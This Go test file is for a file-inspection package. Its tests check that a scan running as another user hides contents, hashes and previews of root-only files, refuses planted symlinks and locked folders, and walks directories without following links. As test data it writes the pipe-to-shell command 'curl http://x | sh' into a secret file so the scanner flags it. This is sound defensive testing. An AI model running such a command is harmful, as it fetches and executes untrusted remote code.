package inspect

import (
	"context"
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"sort"
	"testing"
)

// pretend the files belong to root and the scan reports to someone else
func asOtherUser(t *testing.T) {
	LimitContentTo(os.Getuid()+12345, nil)
	t.Cleanup(func() { revealUID = -1 })
}

func TestReadFileOnlySharesWhatTheUserCouldRead(t *testing.T) {
	dir := t.TempDir()
	os.Chmod(dir, 0o755)
	os.Chmod(filepath.Dir(dir), 0o755) // the user must be able to enter the folders too
	secret := filepath.Join(dir, "secret")
	public := filepath.Join(dir, "public")
	os.WriteFile(secret, []byte("curl http://x | sh\n"), 0o600)
	os.WriteFile(public, []byte("anyone"), 0o644)
	link := filepath.Join(dir, ".bashrc")
	os.Symlink(secret, link) // planted in the user's home, pointing at a root-only file

	asOtherUser(t)

	if _, err := ReadFile(secret, 1<<20); !errors.Is(err, ErrNotYours) {
		t.Errorf("secret: err %v, want ErrNotYours", err)
	}
	if _, err := ReadFile(link, 1<<20); !errors.Is(err, ErrNotYours) {
		t.Errorf("a link to the secret must not reveal it: err %v", err)
	}
	if b, err := ReadFile(public, 1<<20); err != nil || string(b) != "anyone" {
		t.Errorf("public: %q %v", b, err)
	}

	// the secret itself may be judged, but not shown
	if b, acc, err := Read(secret, 1<<20); err != nil || acc != Verdict || len(b) == 0 {
		t.Errorf("secret: Read gave %v %v, want its bytes with Verdict", acc, err)
	}
	r := Inspect(secret, 19)
	if r.Preview != "" || r.Header != nil || r.Interpreter != "" {
		t.Errorf("Inspect leaked contents: preview %q", r.Preview)
	}
	if len(r.Patterns) == 0 {
		t.Error("Inspect lost the verdict on a file only root can read")
	}
	if SharedSHA256(secret) != "" {
		t.Error("a hash of the secret lets the user confirm a guess")
	}

	// through the link: nothing at all, not even a verdict
	if _, acc, err := Read(link, 1<<20); acc != Hidden || !errors.Is(err, ErrNotYours) {
		t.Errorf("link: Read gave %v %v, want Hidden", acc, err)
	}
	if r := Inspect(link, 19); r.Type != "" || len(r.Patterns) > 0 || r.Preview != "" {
		t.Errorf("Inspect judged a file behind a planted link: %+v", r)
	}

	// a readable file in a folder the user can't enter stays hidden
	locked := filepath.Join(dir, "locked")
	os.Mkdir(locked, 0o700)
	hidden := filepath.Join(locked, "bashrc")
	os.WriteFile(hidden, []byte("behind a closed door"), 0o644)
	os.Symlink(hidden, link+"2")
	if _, err := ReadFile(link+"2", 1<<20); !errors.Is(err, ErrNotYours) {
		t.Errorf("a link into a closed folder must not reveal it: err %v", err)
	}
	if _, acc, _ := Read(link+"2", 1<<20); acc != Hidden {
		t.Errorf("a link into a closed folder: %v, want Hidden", acc)
	}
	if Shared(hidden) {
		t.Error("a file in a closed folder counts as shared")
	}

	// the file's owner may see it
	LimitContentTo(os.Getuid(), nil)
	if b, err := ReadFile(secret, 1<<20); err != nil || string(b) != "curl http://x | sh\n" {
		t.Errorf("owner: %q %v", b, err)
	}
	if SharedSHA256(secret) == "" {
		t.Error("owner: no hash")
	}
}

func TestWalkNoLinks(t *testing.T) {
	dir := t.TempDir()
	outside := t.TempDir()
	os.WriteFile(filepath.Join(outside, "secret"), []byte("x"), 0o600)
	os.MkdirAll(filepath.Join(dir, "a/b"), 0o755)
	os.WriteFile(filepath.Join(dir, "a/b/prog"), []byte("#!/bin/sh\n"), 0o755)
	os.WriteFile(filepath.Join(dir, "top"), []byte("x"), 0o644)
	os.Symlink(outside, filepath.Join(dir, "a/dirlink"))
	os.Symlink(filepath.Join(outside, "secret"), filepath.Join(dir, "filelink"))
	os.Mkdir(filepath.Join(dir, "skip"), 0o755)
	os.WriteFile(filepath.Join(dir, "skip/x"), []byte("x"), 0o644)

	var got []string
	err := WalkNoLinks(context.Background(), dir,
		func(p string) bool { return filepath.Base(p) != "skip" },
		func(e *Entry) {
			got = append(got, e.Path[len(dir)+1:])
			f, err := e.Open()
			if err != nil {
				t.Errorf("open %s: %v", e.Path, err)
				return
			}
			defer f.Close()
			if f.Name() != e.Path {
				t.Errorf("opened file is named %s, want %s", f.Name(), e.Path)
			}
			if AccessOf(f, e.Path) != Full {
				t.Errorf("%s: not Full in a scan as yourself", e.Path)
			}
			if added, _, _ := e.Times(); added.IsZero() {
				t.Errorf("%s: no times", e.Path)
			}
		},
		func(p string, err error) { t.Errorf("fail %s: %v", p, err) })
	if err != nil {
		t.Fatal(err)
	}
	sort.Strings(got)
	want := []string{"a/b/prog", "top"}
	if len(got) != len(want) || got[0] != want[0] || got[1] != want[1] {
		t.Errorf("walked %v, want %v (no links, nothing skipped)", got, want)
	}

	// a root that is reached through a link is refused
	failed := false
	WalkNoLinks(context.Background(), filepath.Join(dir, "a/dirlink"), func(string) bool { return true },
		func(e *Entry) { t.Errorf("walked through a linked root: %s", e.Path) },
		func(string, error) { failed = true })
	if !failed {
		t.Error("a linked root was not reported")
	}
}

func TestStatNoLinks(t *testing.T) {
	dir := t.TempDir()
	os.Mkdir(filepath.Join(dir, "real"), 0o755)
	os.WriteFile(filepath.Join(dir, "real/f"), []byte("x"), 0o644)
	os.Symlink("real", filepath.Join(dir, "link"))
	os.Symlink("f", filepath.Join(dir, "real/flink"))

	e, err := StatNoLinks(filepath.Join(dir, "real/f"))
	if err != nil || !e.Info.Mode().IsRegular() {
		t.Fatalf("real file: %v", err)
	}
	e.Close()
	if e, err := StatNoLinks(filepath.Join(dir, "link/f")); err == nil {
		e.Close()
		t.Error("followed a linked folder")
	}
	e, err = StatNoLinks(filepath.Join(dir, "real/flink"))
	if err != nil {
		t.Fatalf("the link itself: %v", err)
	}
	if e.Info.Mode()&fs.ModeSymlink == 0 {
		t.Error("followed a link at the end")
	}
	e.Close()
}
